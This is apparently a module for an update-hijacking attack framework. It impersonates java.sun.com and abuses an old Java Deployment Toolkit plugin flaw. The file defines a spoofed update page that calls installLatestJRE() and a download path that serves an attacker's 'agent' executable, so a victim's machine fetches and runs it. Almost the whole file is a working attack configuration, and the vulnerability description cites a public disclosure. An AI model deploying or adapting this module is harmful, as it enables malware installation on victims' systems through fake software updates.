# -*- coding: utf-8 -*-
from modules import ModuleBase


class JavaDeploymentToolkit(ModuleBase):
    name = ' Java Deployment Toolkit'
    version = '1.0'
    appver = '< v6.0.240.7'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com >']
    description = """Found By: Neal Poole.
            The Java Deployment Toolkit Plugin v6.0.240.7 and below for Firefox and Google Chrome can be used to download
            and run an improperly signed executable on a target’s system. UAC, if enabled, will prompt the user before
            running the executable. This vulnerability has been tested and confirmed to exist on Windows 7, both 32-bit
            and 64-bit. It was fixed in Java 7 and Java 6 Update 29.
            https://nealpoole.com/blog/2011/10/java-deployment-toolkit-plugin-does-not-validate-installer-executable/""",
    vh = '(java.sun.com)' 
    requests = [
        {   'path': '/update.html',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string' : """<html>
<head>
<title>Java Deployment Toolkit update</title>
</head>
<body>
<script src="http://www.java.com/js/deployJava.js"></script>
<script type="text/javascript">
deployJava.getPlugin().installLatestJRE();
</script>
</body>
</html>""",
            'parse': 0,
            'file': '',
        },
        {   'path': '/webapps/download/AutoDL',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]